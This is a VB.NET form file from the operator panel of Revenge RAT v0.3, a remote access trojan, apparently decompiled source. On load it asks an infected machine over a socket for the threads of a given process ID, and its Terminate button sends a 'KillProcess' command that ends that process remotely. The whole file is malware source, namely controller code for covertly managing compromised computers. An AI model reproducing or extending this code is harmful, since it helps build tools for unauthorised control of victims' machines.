Imports Microsoft.VisualBasic.CompilerServices
Imports System.Runtime.CompilerServices
Imports Revenge_RAT_v0._3.RevengeRAT

Public Class Process_Properties
    Public PID As Integer
    Public Sock As Integer
    Private Sub Process_Properties_Load(sender As Object, e As EventArgs) Handles Me.Load
        My.Forms.Main.s.Send(Me.Sock, ("Process Threads" & My.Forms.Main.Key & Conversions.ToString(Me.PID)))
    End Sub

    Private Sub Terminate_Click(sender As Object, e As EventArgs) Handles Terminate.Click
        Dim arguments As Object() = New Object() {Me.Sock, Operators.ConcatenateObject(("KillProcess" & My.Forms.Main.Key), SocketServer.Encode(Conversions.ToString(Me.PID)))}
        Dim copyBack As Boolean() = New Boolean() {True, False}
        NewLateBinding.LateCall(My.Forms.Main.s, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
        If copyBack(0) Then
            Me.Sock = CInt(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(Integer)))
        End If
        Me.Close()
    End Sub
End Class